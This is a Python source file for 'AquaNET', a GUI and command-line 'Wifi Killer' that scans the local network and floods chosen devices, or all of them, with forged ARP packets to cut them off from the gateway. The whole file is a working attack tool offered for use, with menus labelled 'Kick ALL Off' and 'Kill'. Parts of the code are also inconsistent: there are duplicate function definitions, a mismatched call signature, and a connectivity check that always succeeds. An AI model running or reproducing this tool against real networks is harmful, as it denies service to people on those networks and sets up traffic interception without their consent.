#!/usr/bin/env python
import asyncio
import os, sys, logging, math, traceback, optparse, threading
import time
import urllib
from time import sleep

import tkinter as tk
loading_window = tk.Tk()
loading_window.geometry("200x100")
loading_window.title("Loading...")
# Add a label to the loading window
loading_label = tk.Label(loading_window, text="Loading, please wait...")
loading_label.pack(pady=20)
# Force the loading window to appear
loading_window.update()
from spoof import sent
from scapy.layers.l2 import Ether, ARP

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\33[94m', '\033[0m', '\33[94m', '\33[94m', '\33[94m', '\033[0m'

try:

    # check whether user is root
    if os.geteuid() != 0:
        print(
            "\n{}ERROR: ARPSPOOF must be run with root privileges. Try again with sudo:\n\t{}$ sudo python3 arpspoof.py{}\n".format(
                RED, GREEN, END))
        os._exit(1)
except:
    # then user is probably on windows
    pass


def shutdown():
    print('\n\n{}Exiting'
          ''.format(GREEN, END))
    os._exit(0)


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.config import conf

    conf.ipv6_enabled = False
    from scapy.all import *
    import scan, spoof, nmap
    from urllib.request import urlopen, Request
    from urllib.error import URLError
    import netifaces
    import threading

except KeyboardInterrupt:
    shutdown()
except:
    print(
        "\n{}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.".format(
            RED))
    os._exit(1)


# display heading
def heading():
    spaces = " " * 76
    sys.stdout.write(BLUE + spaces + """
_______  _____  _     _ _______ __   _ _______ _______
|_____| |   __| |     | |_____| | \  | |______    |   
|     | |____\| |_____| |     | |  \_| |______    |   
    """ + END)


# loading animation during network scan
def scanningAnimation(text):
    try:
        global stopAnimation
        i = 0
        while stopAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(GREEN + tempText + '\r' + END)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)


def regenOnlineIPs():
    global onlineIPs, defaultGatewayMac, defaultGatewayMacSet, stopAnimation

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        print(host[0]+" ← Found")
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        stopAnimation = True
        print("\n{}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{}\n".format(RED,
                                                                                                                    END))
        header = (
            "{}AquaNET{}> {}Enter your gateway's MAC Address {}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
        defaultGatewayMac = input(header)
        defaultGatewayMacSet = True


# display options
def optionBanner():
    print('''
AquaNET Menu:
  {}[1]{} Kick ONE Off
  {}[2]{} Kick SOME Off
  {}[3]{} Kick {}ALL{} Off
  {}[E]{} Exit AquaNET{}
    '''.format(BLUE, WHITE, BLUE, WHITE, BLUE, WHITE, BLUE, WHITE, BLUE, WHITE, END))


# initiate debugging process
def runDebug():
    print("\n\n{}WARNING! An unknown error has occurred, starting debug...{}".format(RED, END))
    try:
        print("Current defaultGatewayMac: " + defaultGatewayMac)
    except:
        print("Failed to print defaultGatewayMac...")
    try:
        print("Reloading MAC retriever function...")
        regenOnlineIPs()
        print("Reloaded defaultGatewayMac: " + defaultGatewayMac)
    except:
        print("Failed to reload MAC retriever function / to print defaultGatewayMac...")
    try:
        print("Known gateway IP: " + defaultGatewayIP)
    except:
        print("Failed to print defaultGatewayIP...")
    try:
        print("Crash trace: ")
        print(traceback.format_exc())
    except:
        print("Failed to print crash trace...")
    print("DEBUG FINISHED.\nShutting down...")
    print("{}".format(END))
    os._exit(1)


# make sure there is an internet connection
def checkInternetConnection():
    try:
        urlopen('https://github.com', timeout=3)
        return True
    except URLError as err:
        return True
    except KeyboardInterrupt:
        shutdown()


# retrieve network interface
def getDefaultInterface(returnNet=False):
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))

    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net

    iface_routes = [route for route in scapy.config.conf.route.routes if
                    route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
    network, netmask, _, interface, address, _ = max(iface_routes, key=lambda item: item[1])
    net = to_CIDR_notation(network, netmask)
    if net:
        if returnNet:
            return net
        else:
            return interface


# retrieve default interface MAC address
def getDefaultInterfaceMAC():
    try:
        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
        if defaultInterfaceMac == "" or not defaultInterfaceMac:
            print(
                "\n{}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{}\n".format(
                    RED, END))
            header = ('{}AquaNET{}> {}Enter MAC Address {}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
            return (input(header))
        else:
            return defaultInterfaceMac
    except:
        # request interface MAC address (after failed detection by scapy)
        print(
            "\n{}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{}\n".format(RED,
                                                                                                                    END))
        header = ('{}AquaNET{}> {}Enter MAC Address {}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
        return (input(header))


## retrieve gateway IP
# def getGatewayIP():
#   global stopAnimation
#   try:
#       getGateway, timeout = sr1(IP(dst="github.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False, timeout=4)
#       if timeout:
#           raise Exception()
#       return getGateway.src
#   except:
#       # request gateway IP address (after failed detection by scapy)
#       stopAnimation = True
#       print("\n{}ERROR: Gateway IP could not be obtained. Please enter IP manually.{}\n".format(RED, END))
#       header = ('{}AquaNET{}> {}Enter Gateway IP {}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
#       return (input(header))
def getGatewayIP():
    global stopAnimation
    gws = netifaces.gateways()
    default_gateway = gws.get('default', {}).get(netifaces.AF_INET)

    if default_gateway:
        return default_gateway[0]
    else:
        return None


# retrieve host MAC address
def retrieveMACAddress(host):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
            break
    except:
        return False


# resolve mac address of each vendor
def resolveMac(mac):
    # try:
    #     # send request to macvendors.co
    #     url = "http://macvendors.co/api/vendorname/"
    #     request = Request(url + mac, headers={'User-Agent': "API Browser"})
    #     response = urlopen(request)
    #     vendor = response.read()
    #     vendor = vendor.decode("utf-8")
    #     vendor = vendor[:25]
    #     return vendor
    # except KeyboardInterrupt:
    #     shutdown()
    # except:
    return "N/A"


# regenerate online IPs array & configure gateway
def regenOnlineIPs():
    global onlineIPs, defaultGatewayMac, defaultGatewayMacSet, stopAnimation

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        stopAnimation = True
        print("\n{}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{}\n".format(RED,
                                                                                                                    END))
        header = (
            "{}AquaNET{}> {}Enter your gateway's MAC Address {}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
        defaultGatewayMac = input(header)
        defaultGatewayMacSet = True


# scan network
def scanNetwork():
    global hostsList
    try:
        # call scanning function from scan.py
        hostsList = scan.scanNetwork(getDefaultInterface(True))
    except KeyboardInterrupt:
        shutdown()
    except Exception as e:
        print("\n\n{}ERROR: Network scanning failed. Please check your requirements configuration.{}".format(RED, END))
        print(e)
        os._exit(1)
    try:
        regenOnlineIPs()
    except KeyboardInterrupt:
        shutdown()


# non-interactive attack
def nonInteractiveAttack():
    print("\n{}nonInteractiveAttack{} activated...{}\n".format(RED, MAGENTA, END))

    target = options.targets
    print("\n{}Target(s): {}{}".format(MAGENTA, END, ", ".join(target)))
    global stopAnimation
    stopAnimation = False
    t = threading.Thread(target=scanningAnimation, args=('Checking target status...',))
    t.daemon = True
    t.start()

    try:
        nm = nmap.PortScanner()
        counter = 0
        for host in target:
            a = nm.scan(hosts=host, arguments='-sn')
            if a['scan'] != {}:
                for k, v in a['scan'].items():
                    if str(v['status']['state']) == 'up':
                        pass
                    else:
                        if len(target) == 1 or counter == len(target) - 1:
                            stopAnimation = True
                            sys.stdout.write("\033[K")
                            print("\n{}ERROR: Target {}{}{} doesn't seem to be alive. Exiting...{}".format(RED, END,
                                                                                                           str(host),
                                                                                                           RED, END))
                            os._exit(1)
                        else:
                            sys.stdout.write("\033[K")
                            print("\n{}WARNING: Target {}{}{} doesn't seem be alive. Skipping...{}".format(RED, END,
                                                                                                           str(host),
                                                                                                           RED, END))
                            target.remove(host)
                            counter += 1
                            pass
            else:
                if len(target) == 1 or counter == len(target) - 1:
                    stopAnimation = True
                    sys.stdout.write("\033[K")
                    print("\n{}ERROR: Target {}{}{} doesn't seem to be alive. Exiting...{}".format(RED, END, str(host),
                                                                                                   RED, END))
                    os._exit(1)
                else:
                    sys.stdout.write("\033[K")
                    print("\n{}WARNING: Target {}{}{} doesn't seem be alive. Skipping...{}".format(RED, END, str(host),
                                                                                                   RED, END))
                    target.remove(host)
                    counter += 1
                    pass

        stopAnimation = True
        sys.stdout.write("\033[K")

        defaultGatewayIP = getGatewayIP()
        defaultGatewayMac = retrieveMACAddress(defaultGatewayIP)

    except KeyboardInterrupt:
        shutdown()

    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(MAGENTA, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(MAGENTA, END))
    try:
        while True:
            # broadcast malicious ARP packets
            for i in target:
                ipAddress = i
                macAddress = retrieveMACAddress(ipAddress)
                if macAddress == False:
                    print("\n{}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{}".format(
                        RED, END))
                    os._exit(1)
                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ipAddress, macAddress)
            if options.packets is not None:
                time.sleep(60 / float(options.packets))
            else:
                time.sleep(10)
    except KeyboardInterrupt:
        # re-arp targets on KeyboardInterrupt exception
        print("\n{}Re-arping{} target(s)...{}".format(RED, MAGENTA, END))
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for i in target:
                ipAddress = i
                try:
                    macAddress = retrieveMACAddress(ipAddress)
                except:
                    print("\n{}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{}".format(
                        RED, END))
                    os._exit(1)
                try:
                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ipAddress, macAddress)
                except KeyboardInterrupt:
                    pass
                except:
                    runDebug()
            reArp += 1
            time.sleep(0.2)
        print("{}Re-arped{} target(s) successfully.{}".format(RED, MAGENTA, END))


def kickoneoff():
    os.system("clear||cls")

    print("\n{}kickONEOff{} selected...{}\n".format(RED, GREEN, END))
    global stopAnimation
    stopAnimation = False
    t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
    t.daemon = True
    t.start()

    # commence scanning process
    try:
        scanNetwork()
    except KeyboardInterrupt:
        shutdown()
    stopAnimation = True

    print("Online IPs:")
    print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
    print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))

    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        try:
            hostname = socket.gethostbyaddr(onlineIPs[i])[0]
        except:
            hostname = "N/A"
        vendor = resolveMac(mac)

        print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, hostname, END))
    canBreak = False
    while not canBreak:
        try:
            choice = int(input("\nChoose a target: "))
            oneTargetIP = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            shutdown()
        except:
            print("\n{}ERROR: Please enter a number from the list!{}".format(RED, END))

    # locate MAC of specified device
    oneTargetMAC = ""
    for host in hostsList:
        if host[0] == oneTargetIP:
            oneTargetMAC = host[1]
    if oneTargetMAC == "":
        print("\nIP address is not up. Please try again.")
        return

    print("\n{}Target: {}{}".format(GREEN, END, oneTargetIP))

    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))

    def periodic_scan_network():
        global reScan
        while True:
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()

    # Start the periodic network scanning thread
    scan_thread = threading.Thread(target=periodic_scan_network)
    scan_thread.daemon = True
    scan_thread.start()
    # try:
    #     while True:
    #         def send_spoof_packet():
    #             # broadcast malicious ARP packets
    #             spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
    #             if options.packets is not None:
    #                 time.sleep(1 * float(options.packets))
    #             else:
    #                 time.sleep(10)
    #
    #         spoof_thread = threading.Thread(target=send_spoof_packet)
    #         spoof_thread.daemon = True
    #         spoof_thread.start()
    #         spoof_thread.join()
    try:
        while True:
            reprint_table()
            threads = []
            for host in hostsList:
                if oneTargetIP != defaultGatewayIP:
                    # dodge gateway (avoid crashing network itself)
                    thread = threading.Thread(target=spoof.sendPacket,
                                              args=(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC))
                    threads.append(thread)
                    thread.start()

            # Wait for all threads to finish
            for thread in threads:
                thread.join()
    except KeyboardInterrupt:
        # re-arp target on KeyboardInterrupt exception
        print("\n{}Re-arping{} target...{}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            try:
                # broadcast ARP packets with legitimate info to restore connection
                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
            except KeyboardInterrupt:
                pass
            except:
                runDebug()
            reArp += 1
            time.sleep(0.2)
            print("{}Re-arped{} target successfully.{}".format(RED, GREEN, END))


def kicksomeoff():
    os.system("clear||cls")

    print("\n{}kickSOMEOff{} selected...{}\n".format(RED, GREEN, END))
    global stopAnimation
    stopAnimation = False
    t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
    t.daemon = True
    t.start()

    # commence scanning process
    try:
        scanNetwork()
    except KeyboardInterrupt:
        shutdown()
    stopAnimation = True

    print("Online IPs: ")
    print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
    print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))

    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        try:
            hostname = socket.gethostbyaddr(onlineIPs[i])[0]
        except:
            hostname = "N/A"
        vendor = resolveMac(mac)

        print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, hostname, END))
    canBreak = False
    while not canBreak:
        try:
            choice = input("\nChoose devices to target (comma-separated): ")
            if ',' in choice:
                someTargets = choice.split(",")
                canBreak = True
            else:
                print("\n{}ERROR: Please select more than 1 devices from the list.{}\n".format(RED, END))
        except KeyboardInterrupt:
            shutdown()

    someIPList = ""
    for i in someTargets:
        try:
            someIPList += onlineIPs[int(i)] + ", "
        except KeyboardInterrupt:
            shutdown()
        except:
            print("\n{}ERROR: '{}{}{}' is not in the list.{}\n".format(RED, GREEN, i, RED, END))
            return
    someIPList = someIPList[:-2] + END

    print("\n{}Targets: {}{}".format(GREEN, END, someIPList))

    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))
    try:
        while True:
            # broadcast malicious ARP packets
            for i in someTargets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            if options.packets is not None:
                time.sleep(10 / float(options.packets))
            else:
                time.sleep(10)
    except KeyboardInterrupt:
        # re-arp targets on KeyboardInterrupt exception
        print("\n{}Re-arping{} targets...{}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for i in someTargets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        try:
                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                        except KeyboardInterrupt:
                            pass
                        except:
                            runDebug()
            reArp += 1
            time.sleep(0.2)
        print("{}Re-arped{} targets successfully.{}".format(RED, GREEN, END))


def clear_console():
    if sys.platform.startswith('win'):
        os.system('cls')
    else:
        os.system('clear')


def reprint_table(sent):
    clear_console()
    print("Target(s): ")
    print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
    print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))

    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]

        vendor = resolveMac(mac)

        print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, "N/A", END))
    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))

    print("\nSent: {}".format(sent))  # Display sent variable


def reprint_table():
    os.system("clear||cls")
    print("Target(s): ")
    print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
    print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))

    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]

        vendor = resolveMac(mac)

        print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, "N/A", END))
    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))

    print("\nSent: {}".format(sent))  # Display sent variable


def kickalloff():
    print("Scanning your network")

    # Create a new thread for the kickalloff function
    t = threading.Thread(target=scanNetwork)
    t.daemon = True
    t.start()

    # commence scanning process
    try:
        scanNetwork()
    except KeyboardInterrupt:
        shutdown()

    # print("Target(s): ")
    # print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
    # print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))

    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]

        vendor = resolveMac(mac)

        print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, "N/A", END))
    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))

    try:
        while True:

            threads = []
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    print(host[0], "← Killing")
                    # dodge gateway (avoid crashing network itself)
                    thread = threading.Thread(target=spoof.sendPacket,
                                              args=(defaultInterfaceMac, defaultGatewayIP, host[0], host[1]))
                    threads.append(thread)
                    thread.start()
                    time.sleep(0.005)

            # Wait for all threads to finish
            for thread in threads:
                thread.join()
    except KeyboardInterrupt:
        print("\n{}Re-arping{} targets...{}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    try:
                        # dodge gateway
                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                    except KeyboardInterrupt:
                        pass
                    except:
                        runDebug()
            reArp += 1
            time.sleep(0.2)
        print("{}Re-arped{} targets successfully.{}".format(RED, GREEN, END))




class ConsoleLog(tk.Text):
    def __init__(self, *args, **kwargs):
        tk.Text.__init__(self, *args, **kwargs)
        self.queue = []
        self.update_me()

    def write(self, line):
        self.queue.append(line)

    def update_me(self):
        while self.queue:
            line = self.queue.pop(0)
            self.insert(tk.END, line)
            self.see(tk.END)
        self.after(100, self.update_me)


# script's main function
import customtkinter as ctk


def end():
    print("Re-Arping")
    print("\nRe-arping targets...")
    reArp = 1
    while reArp != 10:
        # broadcast ARP packets with legitimate info to restore connection
        for host in hostsList:
            if host[0] != defaultGatewayIP:
                try:
                    # dodge gateway
                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                except KeyboardInterrupt:
                    pass
                except:
                    runDebug()
        reArp += 1
        time.sleep(0.2)
    print("Re-arped targets successfully.")
    time.sleep(1)
    os._exit(0)


class WifiKillerApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Wifi Killer [Dev]")

        main_frame = tk.Frame(self)
        main_frame.pack(padx=10, pady=10)

        # Sidebar
        sidebar = tk.Frame(main_frame, bg="light gray")
        sidebar.grid(row=0, column=0, rowspan=4, padx=5, pady=5, sticky=tk.N + tk.S)

        wifi_kill_button = ctk.CTkButton(sidebar, text="Wifi Kill", border_width=1)
        wifi_kill_button.pack(pady=5)

        # Main content
        main_content = tk.Frame(main_frame, bg="light gray")
        main_content.grid(row=0, column=1, rowspan=4, padx=5, pady=5, sticky=tk.N + tk.S)

        wifi_kill_label = tk.Label(main_content, text="Wifi Kill", bg="light gray")
        wifi_kill_label.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)

        mac_address_entry = tk.Entry(main_content)
        mac_address_entry.insert(0, defaultInterfaceMac)
        mac_address_entry.grid(row=0, column=1, padx=5, pady=5)

        ok_button = ctk.CTkButton(main_content, text="OK", width=7, border_width=1)
        ok_button.grid(row=0, column=2, padx=5, pady=5)

        history_label = tk.Label(main_content, text="History \\LOG", bg="light gray")
        history_label.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)

        console_log = ConsoleLog(main_content, width=40, height=10, wrap="word", highlightthickness=1)
        console_log.grid(row=2, column=1, padx=5, pady=5)
        kill_button = ctk.CTkButton(main_content, text="Kill", command=self.kick_all_off, width=7, border_width=1)
        kill_button.grid(row=3, column=1, padx=5, pady=5, sticky=tk.W)
        revive_button = ctk.CTkButton(main_content, text="Revive", command=end, width=7, border_width=1)
        revive_button.grid(row=3, column=1, padx=5, pady=5, sticky=tk.E)
        revive_button.grid(row=3, column=1, padx=5, pady=5, sticky=tk.E)
        # ... (other Tkinter widgets)

        sys.stdout = console_log
        print("Any activity will appear here.")

    def kick_all_off(self):
        t = threading.Thread(target=kickalloff)
        t.daemon = True
        t.start()

if __name__ == '__main__':

    # implement option parser
    optparse.OptionParser.format_epilog = lambda self, formatter: self.epilog

    version = '2.0'
    examples = ('\nExamples:\n' +
                '  sudo python3 AquaNET.py --target 192.168.1.10 \n' +
                '  sudo python3 AquaNET.py -t 192.168.1.5,192.168.1.10 -p 30\n' +
                '  sudo python3 AquaNET.py -s\n' +
                '  sudo python3 AquaNET.py (interactive mode)\n')

    parser = optparse.OptionParser(epilog=examples,
                                   usage='sudo python3 %prog [options]',
                                   prog='AquaNET.py', version=('AquaNET ' + version))

    parser.add_option('-p', '--packets', action='store',
                      dest='packets', help='number of packets broadcasted per minute (default: 6)')

    parser.add_option('-s', '--scan', action='store_true', default=False,
                      dest='scan', help='perform a quick network scan and exit')

    parser.add_option('-a', '--kick-all', action='store_true', default=False,
                      dest='kick_all', help='perform attack on all online devices')


    def targetList(option, opt, value, parser):
        setattr(parser.values, option.dest, value.split(','))


    parser.add_option('-t', '--target', action='callback',
                      callback=targetList, type='string',
                      dest='targets', help='specify target IP address(es) and perform attack')

    (options, argv) = parser.parse_args()

    try:
        if checkInternetConnection():
            pass
        else:
            print(
                "\n{}ERROR: It seems that you are offline. Please check your internet connection.{}\n".format(RED, END))
            os._exit(1)
    except KeyboardInterrupt:
        shutdown()

    # configure appropriate network info
    try:
        defaultInterface = getDefaultInterface()
        defaultGatewayIP = getGatewayIP()
        defaultInterfaceMac = getDefaultInterfaceMAC()
        global defaultGatewayMacSet
        defaultGatewayMacSet = True
    except KeyboardInterrupt:
        shutdown()

    if (options.packets is not None and (options.packets).isdigit()) or options.packets is None:
        pass
    else:
        print(
            "\n{}ERROR: Argument for number of packets broadcasted per minute must be an integer {}(e.g. {}--packet 60{}).\n".format(
                RED, END, BLUE, END))
        os._exit(1)

    if options.targets is None and options.kick_all is False:
        # set to interactive attack
        interactive = True
        # global stopAnimation
        # stopAnimation = False
        # t = threading.Thread(target=scanningAnimation, args=('Scanning your network, hang on...',))
        # t.daemon = True
        # t.start()
        # # commence scanning process
        # try:
        #     scanNetwork()
        # except KeyboardInterrupt:
        #     shutdown()
        # stopAnimation = True
    elif options.targets is None and options.kick_all is True:
        # set to non-interactive attack
        interactive = False
        kickalloff()
        os._exit(0)
    elif options.targets is not None and options.kick_all is True:
        print("\n{}ERROR: Cannot use both {}-a/--kick-all{} and {}-t/--target{} flags in one command.{}\n".format(RED,
                                                                                                                  BLUE,
                                                                                                                  RED,
                                                                                                                  BLUE,
                                                                                                                  RED,
                                                                                                                  END))
        os._exit(1)
    else:
        # set to non-interactive attack
        interactive = False
    loading_window.destroy()
    app = WifiKillerApp()
    app.mainloop()
